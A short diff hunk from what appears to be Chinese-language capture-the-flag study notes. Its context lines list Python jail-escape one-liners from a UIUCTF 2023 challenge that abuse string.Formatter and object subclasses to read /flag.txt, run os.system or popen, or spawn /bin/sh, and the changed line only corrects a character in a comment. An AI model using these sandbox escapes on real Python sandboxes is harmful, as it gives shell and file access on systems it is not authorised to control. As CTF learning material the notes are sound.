@@ -452,7 +452,7 @@ gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai
     - `[print(y('/flag.txt').read()) for x,y in enumerate(string.Formatter().get_field('a.__self__.open', [], {'a': repr})) if x==0]`
     - `print(string.Formatter().get_field("a.__init__.__globals__[sys]", [], kwargs={"a":string.Formatter().get_field("a.__class__.__base__.__subclasses__", [], kwargs={"a":[]})[0]().pop(107)})[0].modules.pop('os').popen('cmd').read())`
     - https://github.com/nikosChalk/ctf-writeups/tree/master/uiuctf23/pyjail/rattler-read/writeup : `class Baz(string.Formatter): pass; get_field = lambda self, field_name, args, kwargs: (string.Formatter.get_field(self, field_name, args, kwargs)[0]("/bin/sh"), ""); \rBaz().format("{0.Random.__init__.__globals__[_os].system}", random)`
-    - https://ur4ndom.dev/posts/2023-07-02-uiuctf-rattler-read/ ：`string.Formatter().get_field("a.__class__.__base__.__subclasses__", [], {"a": ""})[0]()[84].load_module("os").system("sh")`,`for f in (g := (g.gi_frame.f_back.f_back for _ in [1])): print(f.f_builtins)`(逃逸exec的上下文然后请求builtin。这句还没有实现执行命令或者读文件，只是倒出builtins。导出后参考上面的用法使用)
+    - https://ur4ndom.dev/posts/2023-07-02-uiuctf-rattler-read/ ：`string.Formatter().get_field("a.__class__.__base__.__subclasses__", [], {"a": ""})[0]()[84].load_module("os").system("sh")`,`for f in (g := (g.gi_frame.f_back.f_back for _ in [1])): print(f.f_builtins)`(逃逸exec的上下文然后请求builtin。这句还没有实现执行命令或者读文件，只是导出builtins。导出后参考上面的用法使用)
 40. pwntools可以连接启用ssl/tls的远程服务器，只需给remote添加一个参数`ssl=True`。如：
 
 ```python
